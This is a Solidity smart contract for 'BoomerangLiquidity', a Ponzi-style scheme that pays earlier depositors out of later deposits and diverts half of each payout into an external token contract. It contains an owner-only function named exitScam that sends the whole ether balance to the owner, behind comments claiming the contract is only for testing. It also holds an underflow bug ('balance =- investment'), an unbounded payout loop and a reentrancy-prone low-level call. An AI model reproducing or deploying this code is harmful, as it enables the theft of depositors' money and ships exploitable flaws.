1 pragma solidity 0.4.21;
2 
3 contract ERC20Interface {
4     function totalSupply() public constant returns (uint256);
5     function balanceOf(address tokenOwner) public constant returns (uint256 balance);
6     function allowance(address tokenOwner, address spender) public constant returns (uint256 remaining);
7     function transfer(address to, uint256 tokens) public returns (bool success);
8     function approve(address spender, uint256 tokens) public returns (bool success);
9     function transferFrom(address from, address to, uint256 tokens) public returns (bool success);
10 
11     event Transfer(address indexed from, address indexed to, uint tokens);
12     event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
13 }
14 
15 contract FLMContract {
16     function withdraw() public;
17     function buy() public payable returns(uint256);
18     function myTokens() public view returns(uint256);
19 }
20 
21 contract Owned {
22     address public owner;
23     address public ownerCandidate;
24 
25     function Owned() public {
26         owner = msg.sender;
27     }
28 
29     modifier onlyOwner {
30         require(msg.sender == owner);
31         _;
32     }
33     
34     function changeOwner(address _newOwner) public onlyOwner {
35         ownerCandidate = _newOwner;
36     }
37     
38     function acceptOwnership() public {
39         require(msg.sender == ownerCandidate);  
40         owner = ownerCandidate;
41     }
42     
43 }
44 
45 contract BoomerangLiquidity is Owned {
46     
47     modifier onlyOwner(){
48         require(msg.sender == owner);
49         _;
50     }
51 
52     uint public multiplier;
53     uint public payoutOrder = 0;
54     FLMContract flmContract;
55 
56     function BoomerangLiquidity(uint multiplierPercent, address aFlmContract) public {
57         multiplier = multiplierPercent;
58         flmContract = FLMContract(aFlmContract);
59     }
60     
61     
62     struct Participant {
63         address etherAddress;
64         uint payout;
65     }
66 
67     Participant[] public participants;
68 
69     
70     function() payable public {
71         deposit();
72     }
73     
74     function deposit() payable public {
75         participants.push(Participant(msg.sender, (msg.value * multiplier) / 100));
76     }
77     
78     function payout() public {
79         uint balance = address(this).balance;
80         require(balance > 1);
81         uint investment = balance / 2;
82         balance =- investment;
83         flmContract.buy.value(investment)();
84         while (balance > 0) {
85             uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
86             if(payoutToSend > 0){
87                 participants[payoutOrder].payout -= payoutToSend;
88                 balance -= payoutToSend;
89                 if(!participants[payoutOrder].etherAddress.send(payoutToSend)){
90                     participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)();
91                 }
92             }
93             if(balance > 0){
94                 payoutOrder += 1;
95             }
96         }
97     }
98     
99     function myTokens()
100         public
101         view
102         returns(uint256) {
103         return flmContract.myTokens();    
104     }
105     
106     function withdraw() public {
107         flmContract.withdraw.gas(1000000)();
108     }
109     
110     function donate() payable public {
111     }
112     
113     //THIS CONTRACT IS FOR TESTING. IF THIS IS HERE, DO NOT INVEST REAL MONEY.
114     function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {
115         return ERC20Interface(tokenAddress).transfer(owner, tokens);
116     }
117     
118     //THIS CONTRACT IS FOR TESTING. IF THIS IS HERE, DO NOT INVEST REAL MONEY.
119     function exitScam() onlyOwner public {
120         msg.sender.transfer(address(this).balance);
121     }
122     
123 }